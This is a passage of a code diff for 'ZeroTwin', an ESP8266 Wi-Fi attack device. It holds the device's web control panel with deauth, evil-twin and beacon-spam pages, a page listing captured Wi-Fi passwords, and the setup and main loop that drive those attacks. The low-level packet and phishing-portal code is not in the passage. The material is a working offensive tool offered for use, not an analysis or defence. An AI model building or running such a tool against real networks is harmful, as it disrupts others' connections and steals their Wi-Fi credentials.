+    default: return "black";
+  }
+}
+
+// Updated handleRoot function to restore the navigation menu
+void handleRoot() {
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<title>ZeroTwin v" VERSION "</title>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<style>";
+  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
+  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
+  html += ".header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; }";
+  html += ".card { background-color: #161b22; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
+  html += ".status { font-weight: bold; color: " + getAttackStatusColor() + "; }";
+  html += ".btn { display: inline-block; padding: 10px 15px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
+  html += ".btn-stop { background-color: #f85149; }";
+  html += ".btn-scan { background-color: #1f6feb; }";
+  html += ".btn-attack { background-color: #d29922; }";
+  html += ".nav { display: flex; justify-content: space-around; margin-bottom: 20px; border-bottom: 1px solid #30363d; }";
+  html += ".nav a { text-decoration: none; color: #58a6ff; padding: 10px; font-weight: bold; }";
+  html += ".nav a.active { border-bottom: 2px solid #58a6ff; }";
+  html += ".nav-btn { display: inline-block; padding: 8px 12px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin: 2px; border: none; cursor: pointer; font-family: 'Courier New', monospace; font-size: 12px; }";
+  html += ".nav-btn:hover { background-color: #6e7681; }";
+  html += ".password { background-color: #238636; color: white; padding: 10px; border-radius: 4px; margin-top: 10px; font-weight: bold; }";
+  html += ".terminal { background-color: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 10px; font-family: 'Courier New', monospace; margin-top: 20px; }";
+  html += ".blink { animation: blink 1s infinite; }";
+  html += "@keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }";
+  html += "</style></head><body>";
+  html += "<div class='header'><h1>ZeroTwin v" VERSION "</h1></div>";
+  
+  html += "<div class='container'>";
+  
+  // Navigation Menu
+  html += "<div class='nav'>";
+  html += "<a href='/' class='active'>Dashboard</a>";
+  html += "<a href='/scan'>Scan</a>";
+  html += "<a href='/deauth'>Deauth</a>";
+  html += "<a href='/eviltwin'>Evil Twin</a>";
+  html += "<a href='/beacon'>Beacon</a>";
+  html += "<a href='/credentials'>Credentials</a>";
+  html += "</div>";
+  
+  // Status card
+  html += "<div class='card'>";
+  html += "<h2>Status</h2>";
+  html += "<p><strong>Mode:</strong> <span class='status'>" + getAttackStatus() + "</span></p>";
+  html += "<p><strong>APs Found:</strong> " + String(apCount) + "</p>";
+  html += "<p><strong>Time:</strong> " + formatTime() + "</p>";
+  html += "<p><strong>Credentials Captured:</strong> " + String(credentialCount) + "</p>";
+  
+  // Show latest captured password if available
+  if (credentialCount > 0) {
+    html += "<div class='password'>";
+    html += "<strong>Latest Capture:</strong><br>";
+    html += "<strong>SSID:</strong> " + capturedCredentials[credentialCount-1].ssid + "<br>";
+    html += "<strong>Password:</strong> " + capturedCredentials[credentialCount-1].password + "<br>";
+    html += "<strong>Time:</strong> " + capturedCredentials[credentialCount-1].timestamp;
+    html += "</div>";
+  }
+  
+  if (currentAttack == ATTACK_OFF) {
+    html += "<a href='/scan' class='btn btn-scan'>Scan Networks</a>";
+    html += "<a href='/credentials' class='btn btn-attack'>View Credentials</a>";
+  } else {
+    html += "<a href='/stop' class='btn btn-stop'>Stop Attack</a>";
+  }
+  
+  // Terminal-like output
+  html += "<div class='terminal'>";
+  html += "<p>> Status: <span class='status'>" + getAttackStatus() + "</span></p>";
+  if (currentAttack == ATTACK_EVIL_TWIN) {
+    html += "<p>> Evil Twin SSID: " + evilTwinSSID + "</p>";
+    html += "<p>> Clients connected: " + String(WiFi.softAPgetStationNum()) + "</p>";
+    if (!evilTwinCapturedPassword.isEmpty()) {
+      html += "<p>> Last password attempt: " + _tryPassword + "</p>";
+    }
+  }
+  html += "<p>> Credentials captured: " + String(credentialCount) + "</p>";
+  html += "<p>> Ready <span class='blink'>_</span></p>";
+  html += "</div>";
+  
+  html += "</div>";
+  
+  // Quick actions card
+  html += "<div class='card'>";
+  html += "<h2>Quick Actions</h2>";
+  html += "<a href='/deauth' class='btn btn-attack'>Deauth Setup</a>";
+  html += "<a href='/eviltwin' class='btn btn-attack'>Evil Twin Setup</a>";
+  html += "<a href='/beacon' class='btn btn-attack'>Beacon Setup</a>";
+  html += "</div>";
+  
+  html += "</div></body></html>";
+  webServer.send(200, "text/html", html);
+}
+
+// Updated handleCredentials function to include navigation
+void handleCredentials() {
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<title>Captured Credentials - ZeroTwin v" VERSION "</title>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<style>";
+  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
+  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
+  html += ".header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; }";
+  html += ".card { background-color: #161b22; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
+  html += ".btn { display: inline-block; padding: 10px 15px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
+  html += ".btn-back { background-color: #6e7681; }";
+  html += ".btn-clear { background-color: #f85149; }";
+  html += ".nav { display: flex; justify-content: space-around; margin-bottom: 20px; border-bottom: 1px solid #30363d; }";
+  html += ".nav a { text-decoration: none; color: #58a6ff; padding: 10px; font-weight: bold; }";
+  html += ".nav a.active { border-bottom: 2px solid #58a6ff; }";
+  html += ".credential-item { background-color: #21262d; padding: 15px; margin: 10px 0; border-radius: 4px; border-left: 4px solid #3fb950; }";
+  html += ".credential-header { display: flex; justify-content: between; align-items: center; margin-bottom: 10px; }";
+  html += ".credential-ssid { font-weight: bold; font-size: 1.1em; color: #58a6ff; }";
+  html += ".credential-timestamp { color: #8b949e; font-size: 0.9em; }";
+  html += ".credential-password { font-family: monospace; background: #0d1117; padding: 8px; border-radius: 3px; margin-top: 5px; }";
+  html += ".empty-state { text-align: center; padding: 40px; color: #8b949e; }";
+  html += "</style></head><body>";
+  html += "<div class='header'><h1>Captured Credentials</h1></div>";
+  
+  html += "<div class='container'>";
+  
+  // Navigation Menu
+  html += "<div class='nav'>";
+  html += "<a href='/'>Dashboard</a>";
+  html += "<a href='/scan'>Scan</a>";
+  html += "<a href='/deauth'>Deauth</a>";
+  html += "<a href='/eviltwin'>Evil Twin</a>";
+  html += "<a href='/beacon'>Beacon</a>";
+  html += "<a href='/credentials' class='active'>Credentials</a>";
+  html += "</div>";
+  
+  html += "<div class='card'>";
+  
+  if (credentialCount == 0) {
+    html += "<div class='empty-state'>";
+    html += "<h3>No credentials captured yet</h3>";
+    html += "<p>Start an Evil Twin attack to capture Wi-Fi passwords</p>";
+    html += "</div>";
+  } else {
+    html += "<h2>Total Credentials: " + String(credentialCount) + "</h2>";
+    
+    for (int i = credentialCount - 1; i >= 0; i--) {
+      html += "<div class='credential-item'>";
+      html += "<div class='credential-header'>";
+      html += "<span class='credential-ssid'>" + capturedCredentials[i].ssid + "</span>";
+      html += "<span class='credential-timestamp'>" + capturedCredentials[i].timestamp + "</span>";
+      html += "</div>";
+      html += "<div class='credential-password'>" + capturedCredentials[i].password + "</div>";
+      html += "</div>";
+    }
+    
+    html += "<a href='/clear' class='btn btn-clear'>Clear All</a>";
+  }
+  
+  html += "<a href='/' class='btn btn-back'>Back to Dashboard</a>";
+  html += "</div>";
+  html += "</div></body></html>";
+  
+  webServer.send(200, "text/html", html);
+}
+
+// Updated handleScan function to include navigation
+void handleScan() {
+  if (currentAttack != ATTACK_OFF) {
+    webServer.sendHeader("Location", "/");
+    webServer.send(303);
+    return;
+  }
+  
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<title>Network Scan - ZeroTwin v" VERSION "</title>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<style>";
+  html += "body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; }";
+  html += ".container { max-width: 800px; margin: 0 auto; padding: 20px; }";
+  html += ".header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; }";
+  html += ".card { background-color: #161b22; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.3); padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; }";
+  html += ".btn { display: inline-block; padding: 10px 15px; background-color: #58a6ff; color: white; text-decoration: none; border-radius: 4px; margin-right: 10px; border: none; cursor: pointer; font-family: 'Courier New', monospace; }";
+  html += ".btn-scan { background-color: #1f6feb; }";
+  html += ".btn-back { background-color: #f85149; }";
+  html += ".nav { display: flex; justify-content: space-around; margin-bottom: 20px; border-bottom: 1px solid #30363d; }";
+  html += ".nav a { text-decoration: none; color: #58a6ff; padding: 10px; font-weight: bold; }";
+  html += ".nav a.active { border-bottom: 2px solid #58a6ff; }";
+  html += ".ap-list { margin-top: 15px; }";
+  html += ".ap-item { padding: 10px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }";
+  html += ".ap-item:hover { background-color: #1f2938; }";
+  html += ".selected { background-color: #1f2938; }";
+  html += ".rssi { color: #3fb950; }";
+  html += ".channel { color: #a5d6ff; }";
+  html += "</style></head><body>";
+  html += "<div class='header'><h1>Network Scan</h1></div>";
+  
+  html += "<div class='container'>";
+  
+  // Navigation Menu
+  html += "<div class='nav'>";
+  html += "<a href='/'>Dashboard</a>";
+  html += "<a href='/scan' class='active'>Scan</a>";
+  html += "<a href='/deauth'>Deauth</a>";
+  html += "<a href='/eviltwin'>Evil Twin</a>";
+  html += "<a href='/beacon'>Beacon</a>";
+  html += "<a href='/credentials'>Credentials</a>";
+  html += "</div>";
+  
+  html += "<div class='card'>";
+  
+  if (apCount == 0) {
+    html += "<p>No networks found. Scan again?</p>";
+  } else {
+    html += "<p>Found " + String(apCount) + " networks:</p>";
+    html += "<div class='ap-list'>";
+    
+    for (uint8_t i = 0; i < apCount; i++) {
+      String itemClass = "ap-item";
+      if (accessPoints[i].selected) itemClass += " selected";
+      
+      html += "<div class='" + itemClass + "'>";
+      html += "<div>";
+      html += "<strong>" + accessPoints[i].ssid + "</strong><br>";
+      html += "<small>" + accessPoints[i].bssid + "</small>";
+      html += "</div>";
+      html += "<div style='text-align: right;'>";
+      html += "<span class='rssi'>" + String(accessPoints[i].rssi) + " dBm</span><br>";
+      html += "<span class='channel'>CH " + String(accessPoints[i].channel) + "</span>";
+      html += "</div>";
+      html += "</div>";
+    }
+    
+    html += "</div>";
+  }
+  
+  html += "<a href='/scan?rescan=1' class='btn btn-scan'>Rescan Networks</a>";
+  html += "<a href='/' class='btn btn-back'>Back to Dashboard</a>";
+  html += "</div>";
+  html += "</div></body></html>";
+  
+  webServer.send(200, "text/html", html);
+  
+  if (webServer.hasArg("rescan")) {
+    scanNetworks();
+  }
+}
+
+void handleDeauth() {
+  if (currentAttack != ATTACK_OFF) {
+    webServer.sendHeader("Location", "/");
+    webServer.send(303);
+    return;
+  }
+  
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<title>Deauth Attack - ZeroTwin</title>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<style>body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; } .container { max-width: 800px; margin: 0 auto; padding: 20px; } .header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; } .card { background-color: #161b22; border-radius: 5px; padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; } .btn { padding: 10px 15px; background-color: #f85149; color: white; text-decoration: none; border-radius: 4px; border: none; cursor: pointer; } .checkbox { margin-bottom: 10px; } .nav { display: flex; justify-content: space-around; margin-bottom: 20px; border-bottom: 1px solid #30363d; } .nav a { text-decoration: none; color: #58a6ff; padding: 10px; font-weight: bold; } .nav a.active { border-bottom: 2px solid #58a6ff; }</style>";
+  html += "</head><body>";
+  html += "<div class='header'><h1>Deauth Attack Setup</h1></div>";
+  html += "<div class='container'>";
+  
+  html += "<div class='nav'>";
+  html += "<a href='/'>Dashboard</a>";
+  html += "<a href='/scan'>Scan</a>";
+  html += "<a href='/deauth' class='active'>Deauth</a>";
+  html += "<a href='/eviltwin'>Evil Twin</a>";
+  html += "<a href='/beacon'>Beacon</a>";
+  html += "<a href='/credentials'>Credentials</a>";
+  html += "</div>";
+  
+  html += "<div class='card'>";
+  html += "<form action='/startdeauth' method='POST'>";
+  html += "<h3>Select Target Networks</h3>";
+  if (apCount == 0) {
+    html += "<p>No networks found. Please <a href='/scan'>scan</a> first.</p>";
+  } else {
+    for (uint8_t i = 0; i < apCount; i++) {
+      html += "<div class='checkbox'><input type='checkbox' name='ap" + String(i) + "' id='ap" + String(i) + "'> <label for='ap" + String(i) + "'>" + accessPoints[i].ssid + " (" + accessPoints[i].bssid + ")</label></div>";
+    }
+    html += "<br><button type='submit' class='btn'>Start Deauth</button>";
+  }
+  html += "</form>";
+  html += "</div></div></body></html>";
+  
+  webServer.send(200, "text/html", html);
+}
+
+void handleStartDeauth() {
+  if (currentAttack != ATTACK_OFF) {
+    webServer.sendHeader("Location", "/");
+    webServer.send(303);
+    return;
+  }
+
+  for (uint8_t i = 0; i < apCount; i++) {
+    accessPoints[i].selected = webServer.hasArg("ap" + String(i));
+  }
+
+  if (countSelectedNetworks() > 0) {
+    startAttack(ATTACK_DEAUTH);
+  }
+  webServer.sendHeader("Location", "/");
+  webServer.send(303);
+}
+
+void handleEvilTwinSetup() {
+  if (currentAttack != ATTACK_OFF) {
+    webServer.sendHeader("Location", "/");
+    webServer.send(303);
+    return;
+  }
+  
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<title>Evil Twin Setup - ZeroTwin</title>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<style>body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; } .container { max-width: 800px; margin: 0 auto; padding: 20px; } .header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; } .card { background-color: #161b22; border-radius: 5px; padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; } .btn { padding: 10px 15px; background-color: #d29922; color: white; text-decoration: none; border-radius: 4px; border: none; cursor: pointer; } .nav { display: flex; justify-content: space-around; margin-bottom: 20px; border-bottom: 1px solid #30363d; } .nav a { text-decoration: none; color: #58a6ff; padding: 10px; font-weight: bold; } .nav a.active { border-bottom: 2px solid #58a6ff; }</style>";
+  html += "</head><body>";
+  html += "<div class='header'><h1>Evil Twin Attack Setup</h1></div>";
+  html += "<div class='container'>";
+
+  html += "<div class='nav'>";
+  html += "<a href='/'>Dashboard</a>";
+  html += "<a href='/scan'>Scan</a>";
+  html += "<a href='/deauth'>Deauth</a>";
+  html += "<a href='/eviltwin' class='active'>Evil Twin</a>";
+  html += "<a href='/beacon'>Beacon</a>";
+  html += "<a href='/credentials'>Credentials</a>";
+  html += "</div>";
+
+  html += "<div class='card'>";
+  html += "<form action='/starteviltwin' method='POST'>";
+  html += "<h3>Select Target Network</h3>";
+  if (apCount == 0) {
+    html += "<p>No networks found. Please <a href='/scan'>scan</a> first.</p>";
+  } else {
+    for (uint8_t i = 0; i < apCount; i++) {
+      html += "<div><input type='radio' name='target' value='" + String(i) + "' id='ap" + String(i) + "'> <label for='ap" + String(i) + "'>" + accessPoints[i].ssid + " (" + accessPoints[i].bssid + ")</label></div>";
+    }
+    html += "<br><button type='submit' class='btn'>Start Evil Twin</button>";
+  }
+  html += "</form>";
+  html += "</div></div></body></html>";
+  
+  webServer.send(200, "text/html", html);
+}
+
+void handleStartEvilTwin() {
+  if (currentAttack != ATTACK_OFF) {
+    webServer.sendHeader("Location", "/");
+    webServer.send(303);
+    return;
+  }
+
+  if (webServer.hasArg("target")) {
+    int targetIndex = webServer.arg("target").toInt();
+    if (targetIndex >= 0 && targetIndex < apCount) {
+      evilTwinSSID = accessPoints[targetIndex].ssid;
+      realAPBSSID = accessPoints[targetIndex].bssid;
+      realAPChannel = accessPoints[targetIndex].channel;
+      startAttack(ATTACK_EVIL_TWIN);
+    }
+  }
+  webServer.sendHeader("Location", "/");
+  webServer.send(303);
+}
+
+void handleBeacon() {
+  if (currentAttack != ATTACK_OFF) {
+    webServer.sendHeader("Location", "/");
+    webServer.send(303);
+    return;
+  }
+  
+  String html = "<!DOCTYPE html><html><head>";
+  html += "<title>Beacon Spam - ZeroTwin</title>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<style>body { font-family: 'Courier New', monospace; margin: 0; padding: 0; background-color: #0d1117; color: #c9d1d9; } .container { max-width: 800px; margin: 0 auto; padding: 20px; } .header { background-color: #161b22; color: #58a6ff; padding: 15px; text-align: center; margin-bottom: 20px; border-bottom: 1px solid #58a6ff; } .card { background-color: #161b22; border-radius: 5px; padding: 20px; margin-bottom: 20px; border: 1px solid #30363d; } .btn { padding: 10px 15px; background-color: #1f6feb; color: white; text-decoration: none; border-radius: 4px; border: none; cursor: pointer; } .nav { display: flex; justify-content: space-around; margin-bottom: 20px; border-bottom: 1px solid #30363d; } .nav a { text-decoration: none; color: #58a6ff; padding: 10px; font-weight: bold; } .nav a.active { border-bottom: 2px solid #58a6ff; }</style>";
+  html += "</head><body>";
+  html += "<div class='header'><h1>Beacon Spam Attack</h1></div>";
+  html += "<div class='container'>";
+
+  html += "<div class='nav'>";
+  html += "<a href='/'>Dashboard</a>";
+  html += "<a href='/scan'>Scan</a>";
+  html += "<a href='/deauth'>Deauth</a>";
+  html += "<a href='/eviltwin'>Evil Twin</a>";
+  html += "<a href='/beacon' class='active'>Beacon</a>";
+  html += "<a href='/credentials'>Credentials</a>";
+  html += "</div>";
+
+  html += "<div class='card'>";
+  html += "<h3>Beacon Spam</h3>";
+  html += "<p>This will broadcast numerous fake Wi-Fi networks.</p>";
+  html += "<form action='/startbeacon' method='POST'><button type='submit' class='btn'>Start Beacon Spam</button></form>";
+  html += "</div></div></body></html>";
+
+  webServer.send(200, "text/html", html);
+}
+
+void handleStartBeacon() {
+  if (currentAttack != ATTACK_OFF) {
+    webServer.sendHeader("Location", "/");
+    webServer.send(303);
+    return;
+  }
+  startAttack(ATTACK_BEACON);
+  webServer.sendHeader("Location", "/");
+  webServer.send(303);
+}
+
+void handleStop() {
+  stopAttack();
+  webServer.sendHeader("Location", "/");
+  webServer.send(303);
+}
+
+void handleClear() {
+  credentialCount = 0;
+  webServer.sendHeader("Location", "/credentials");
+  webServer.send(303);
+}
+
+void initWebServer() {
+  webServer.on("/", handleRoot);
+  webServer.on("/scan", handleScan);
+  webServer.on("/deauth", handleDeauth);
+  webServer.on("/startdeauth", handleStartDeauth);
+  webServer.on("/eviltwin", handleEvilTwinSetup);
+  webServer.on("/starteviltwin", handleStartEvilTwin);
+  webServer.on("/beacon", handleBeacon);
+  webServer.on("/startbeacon", handleStartBeacon);
+  webServer.on("/stop", handleStop);
+  webServer.on("/credentials", handleCredentials);
+  webServer.on("/clear", handleClear);
+  webServer.onNotFound([]() {
+    webServer.sendHeader("Location", "/");
+    webServer.send(303);
+  });
+  
+  webServer.begin();
+}
+
+String bytesToStr(const uint8_t* b, uint32_t size) {
+  String str;
+  const char ZERO = '0';
+  const char DOUBLEPOINT = ':';
+  for (uint32_t i = 0; i < size; i++) {
+    if (b[i] < 0x10) str += ZERO;
+    str += String(b[i], HEX);
+
+    if (i < size - 1) str += DOUBLEPOINT;
+  }
+  return str;
+}
+
+void setup() {
+  Serial.begin(115200);
+  
+  // Initialize components
+  initDisplay();
+  initButtons();
+  initWiFi();
+  initWebServer();
+  
+  // Set initial time
+  setTime(12, 0, 0, 1, 1, 2023);
+  
+  // Configure LED
+  pinMode(LED_PIN, OUTPUT);
+  digitalWrite(LED_PIN, LOW);
+  
+  // Show ZeroTwin boot screen
+  display.clear();
+  display.drawXbm(0, 0, 128, 64, zeroTwinBoot); 
+  display.drawString(65, 20, "./ZeroTwin");
+  display.drawString(68, 30, "> v" VERSION);
+  display.display();
+  delay(3000);
+  
+  display.clear();
+  display.setFont(ArialMT_Plain_10);
+  display.drawString(0, 10, "[*] Starting ZeroTwin " VERSION);
+  delay(1000);
+  display.display();
+
+  display.drawString(0, 20, "[*] Configuring ESP8266 AP-STA");
+  delay(1000);
+  display.display();
+  
+  display.drawString(0, 30, "[+] AP SSID > ZeroTwin");
+  delay(1000);
+  display.display();
+  
+  display.drawString(0, 40, "[+] AP PASS > zerotwin");
+  delay(1000);
+  display.display();
+  
+  display.drawString(0, 50, "[*] Ready for operations");
+  delay(1000);
+  display.display();
+}
+
+void loop() {
+  static uint32_t lastChannelHop = 0;
+  static uint32_t lastUpdate = 0;
+  
+  // Update current time
+  currentTime = now();
+  
+  // Handle button presses
+  handleButtons();
+  
+  // Handle web server requests
+  webServer.handleClient();
+  dnsServer.processNextRequest();
+  
+  // Channel hopping only during network scan
+  if (currentMenu == SCAN_NETWORKS && channelHop && millis() - lastChannelHop > CHANNEL_HOP_INTERVAL) {
+    lastChannelHop = millis();
+    currentChannel = (currentChannel % 13) + 1;
+    wifi_set_channel(currentChannel);
+  }
+  
+  // Execute current attack
+  executeAttack();
+  
+  // Auto-scan if no networks found
+  if (apCount == 0 && millis() - lastScanTime > SCAN_INTERVAL) {
+    scanNetworks();
+  }
+  
+  // Update display periodically
+  if (millis() - lastUpdate > 100) {
+    lastUpdate = millis();
+    updateDisplay();
+  }
+}
